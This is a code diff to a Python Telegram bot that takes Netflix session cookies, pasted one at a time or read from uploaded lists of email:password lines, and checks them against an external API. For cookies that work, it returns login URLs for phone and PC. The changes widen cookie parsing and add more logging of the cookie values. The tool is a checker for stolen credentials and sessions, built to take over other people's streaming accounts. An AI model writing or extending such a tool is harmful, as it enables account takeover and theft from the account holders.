@@ -173,27 +173,55 @@ def authorized_only(func):
         return await func(update, context, *args, **kwargs)
     return wrapper
 
-# ==================== NETFLIX ID EXTRACTOR ====================
+# ==================== IMPROVED NETFLIX ID EXTRACTOR ====================
 
 def extract_netflix_id_from_cookie(cookie_text):
-    """Extract NetflixId from various cookie formats"""
+    """Extract Netflix ID from various cookie formats"""
     if not cookie_text:
         return None
     
-    patterns = [
-        r'NetflixId=([^&\s]+)',
-        r'netflixid=([^&\s]+)',
-        r'NetflixId%3D([^&\s]+)',
-        r'netflixid%3D([^&\s]+)',
-    ]
+    # Clean the input - remove any whitespace and newlines
+    cookie_text = cookie_text.strip()
     
-    for pattern in patterns:
-        match = re.search(pattern, cookie_text, re.IGNORECASE)
-        if match:
-            netflix_id = match.group(1).strip()
+    # Pattern 1: NetflixId=value format (with or without space)
+    match = re.search(r'NetflixId\s*=\s*([^\s\n]+)', cookie_text, re.IGNORECASE)
+    if match:
+        netflix_id = match.group(1).strip()
+        # Remove any trailing characters like & or |
+        netflix_id = netflix_id.split('&')[0].split('|')[0].strip()
+        if netflix_id:
+            logger.info(f"Extracted Netflix ID from NetflixId= format: {netflix_id[:50]}...")
             return netflix_id
     
-    return cookie_text
+    # Pattern 2: Direct ct%3D... format (without NetflixId prefix)
+    # Check if it starts with ct%3D or contains ct%3D at the beginning
+    if cookie_text.startswith('ct%3D') or 'ct%3D' in cookie_text:
+        # Extract from ct%3D to the end or until & or |
+        match = re.search(r'(ct%3D[^&\n|]+)', cookie_text, re.IGNORECASE)
+        if match:
+            netflix_id = match.group(1).strip()
+            logger.info(f"Extracted Netflix ID from ct%3D format: {netflix_id[:50]}...")
+            return netflix_id
+    
+    # Pattern 3: URL encoded format
+    match = re.search(r'(v%3D3%26ct%3D[^&\n|]+)', cookie_text, re.IGNORECASE)
+    if match:
+        netflix_id = match.group(1).strip()
+        logger.info(f"Extracted Netflix ID from v%3D3%26ct%3D format: {netflix_id[:50]}...")
+        return netflix_id
+    
+    # Pattern 4: If it's already a Netflix ID string (contains %3D)
+    if '%3D' in cookie_text and len(cookie_text) > 50:
+        logger.info(f"Using full cookie as Netflix ID: {cookie_text[:50]}...")
+        return cookie_text
+    
+    # If nothing matches, try to see if it's just the raw value
+    if len(cookie_text) > 100 and '=' not in cookie_text:
+        logger.info(f"Using raw text as Netflix ID: {cookie_text[:50]}...")
+        return cookie_text
+    
+    logger.warning(f"Could not extract Netflix ID from: {cookie_text[:100]}")
+    return None
 
 # ==================== ENHANCED FORMAT PARSER ====================
 
@@ -206,19 +234,27 @@ def parse_account_line(line):
         
         account = {}
         
+        # First, try to extract Netflix ID directly from the line
+        netflix_id = extract_netflix_id_from_cookie(line)
+        if netflix_id:
+            account['netflix_id'] = netflix_id
+        
         parts = line.split('|', 1)
         first_part = parts[0].strip()
         
-        if ':' in first_part:
+        # Extract email and password if present
+        if ':' in first_part and not first_part.startswith('http'):
             email_pass = first_part.split(':', 1)
             account['email'] = email_pass[0].strip()
             account['password'] = email_pass[1].strip()
         else:
-            email_pass_match = re.search(r'([^\s:]+):([^\s|]+)', first_part)
-            if email_pass_match:
-                account['email'] = email_pass_match.group(1).strip()
-                account['password'] = email_pass_match.group(2).strip()
+            # Try to find email in the line
+            email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
+            if email_match:
+                account['email'] = email_match.group(1)
+                account['password'] = "••••••••"
         
+        # Parse additional metadata if present
         if len(parts) > 1:
             remaining = parts[1]
             
@@ -243,16 +279,10 @@ def parse_account_line(line):
                             account['quality'] = value
                         elif 'maxstreams' in key_lower or 'streams' in key_lower:
                             account['streams'] = value
-                        elif 'netflixcookies' in key_lower or 'cookie' in key_lower or 'netflixid' in key_lower:
-                            account['full_cookie'] = value
-                            netflix_id = extract_netflix_id_from_cookie(value)
-                            if netflix_id:
-                                account['netflix_id'] = netflix_id
                         elif 'membersince' in key_lower:
                             account['member_since'] = value
                         elif 'paymentmethod' in key_lower:
                             account['payment_method'] = value
-            
             else:
                 fields = remaining.split('|')
                 for field in fields:
@@ -266,28 +296,29 @@ def parse_account_line(line):
                             account['phone'] = value
                         elif 'country' in key:
                             account['country'] = value
-                        elif 'cookie' in key:
-                            account['full_cookie'] = value
-                            netflix_id = extract_netflix_id_from_cookie(value)
-                            if netflix_id:
-                                account['netflix_id'] = netflix_id
         
+        # If no Netflix ID found yet, try again with the whole line
         if 'netflix_id' not in account:
             netflix_id = extract_netflix_id_from_cookie(line)
             if netflix_id:
                 account['netflix_id'] = netflix_id
-                if 'email' not in account:
-                    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
-                    if email_match:
-                        account['email'] = email_match.group(1)
+        
+        # If still no Netflix ID, try to extract from the first part
+        if 'netflix_id' not in account and first_part:
+            netflix_id = extract_netflix_id_from_cookie(first_part)
+            if netflix_id:
+                account['netflix_id'] = netflix_id
         
         if 'netflix_id' not in account:
+            logger.warning(f"No Netflix ID found in line: {line[:100]}")
             return None
         
+        # Set default email if not found
         if 'email' not in account:
             account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
             account['password'] = "••••••••"
         
+        logger.info(f"Successfully parsed account: Email={account['email']}, Netflix ID={account['netflix_id'][:50]}...")
         return account
         
     except Exception as e:
@@ -315,10 +346,12 @@ async def check_with_your_api(netflix_id, email="unknown@email.com"):
             "secret_key": SECRET_KEY
         }
         
-        logger.info(f"📡 Calling API for {email}")
+        logger.info(f"📡 Calling API for {email} with Netflix ID: {netflix_id[:50]}...")
         
         response = requests.post(url, json=data, timeout=15)
         result = response.json()
+        
+        logger.info(f"API Response: {result}")
         
         if result.get('success'):
             login_url = result.get('login_url')
@@ -457,8 +490,9 @@ Send a .txt file with accounts
 🔍 **Single Check:**
 `/check YOUR_NETFLIX_ID`
 
-Example:
-`/check v%3D3%26ct%3DBgjH...`
+Examples:
+• `/check ct%3DBgjHlOvcAxLuAw0y...`
+• `/check NetflixId=ct%3DBgjHlOvcAxLuAw0y...`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ✨ {YOUR_CREDIT} ✨
@@ -536,24 +570,27 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📝 Type: `/check` followed by your code
 
-Example:
-`/check v%3D3%26ct%3DBgjH...`
+Examples:
+`/check ct%3DBgjHlOvcAxLuAw0y...`
+`/check NetflixId=ct%3DBgjHlOvcAxLuAw0y...`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✨ {YOUR_CREDIT} ✨
         """
         await update.message.reply_text(error_msg, parse_mode='Markdown')
         return
     
     user_input = ' '.join(context.args)
     
-    if 'NetflixId=' in user_input or 'netflixid=' in user_input:
-        match = re.search(r'NetflixId=([^\s]+)', user_input, re.IGNORECASE)
-        netflix_id = match.group(1) if match else user_input
-    else:
-        netflix_id = user_input
+    # Extract Netflix ID from various formats
+    netflix_id = extract_netflix_id_from_cookie(user_input)
     
-    netflix_id = netflix_id.strip('"\'')
+    if not netflix_id:
+        # If extraction fails, use the raw input
+        netflix_id = user_input.strip('"\'')
     
     checking_msg = await update.message.reply_text(
-        f"**⏳ Checking...** 🔍",
+        f"**⏳ Checking...** 🔍\n\n`{netflix_id[:100]}...`",
         parse_mode='Markdown'
     )
     
@@ -569,7 +606,7 @@ Example:
     if result.get('success'):
         valid_accounts += 1
         
-        short_id = netflix_id[:15] + "..." if len(netflix_id) > 15 else netflix_id
+        short_id = netflix_id[:30] + "..." if len(netflix_id) > 30 else netflix_id
         
         # Get phone URL (fallback to PC URL if not available)
         phone_url = result.get('phone_url', result['login_url'])
@@ -611,7 +648,7 @@ Example:
     else:
         invalid_accounts += 1
         
-        short_id = netflix_id[:15] + "..." if len(netflix_id) > 15 else netflix_id
+        short_id = netflix_id[:30] + "..." if len(netflix_id) > 30 else netflix_id
         
         error_msg = f"""
 ╔══════════════════════════════════════╗
@@ -622,6 +659,7 @@ Example:
 🔑 **Code:** `{short_id}`
 
 ❌ This Netflix code is not working
+📝 Error: {result.get('error', 'Invalid or expired')}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💡 Please try another code
@@ -685,8 +723,9 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for i, line in enumerate(accounts, 1):
             account = parse_account_line(line)
             
-            if not account:
+            if not account or 'netflix_id' not in account:
                 invalid_count += 1
+                logger.warning(f"Skipping line {i}: No valid Netflix ID found")
                 continue
             
             if i % 3 == 0 or i == len(accounts):
@@ -695,7 +734,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     parse_mode='Markdown'
                 )
             
-            result = await check_with_your_api(account['netflix_id'], account['email'])
+            result = await check_with_your_api(account['netflix_id'], account.get('email', 'unknown'))
             
             total_checks += 1
             
@@ -721,7 +760,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ╚══════════════════════════════════════╝
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📧 **Email:** `{account['email']}`
+📧 **Email:** `{account.get('email', 'N/A')}`
 {details_str}
 
 📱 **Phone URL:**
@@ -788,7 +827,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"Error: {e}")
         await progress_msg.edit_text(
-            f"**⚠️ Error**\n💡 Please try again",
+            f"**⚠️ Error**\n💡 Please try again\n\nError: {str(e)[:100]}",
             parse_mode='Markdown'
         )
 
@@ -812,6 +851,7 @@ async def run_bot():
     print(f"✅ Authorized Users: {len(AUTHORIZED_USERS)}")
     print(f"✅ Credit: {YOUR_CREDIT}")
     print(f"✅ Mobile Support: Enabled")
+    print(f"✅ Cookie Format Support: Multiple formats")
     print("=" * 50)
     
     clear_telegram_webhook()
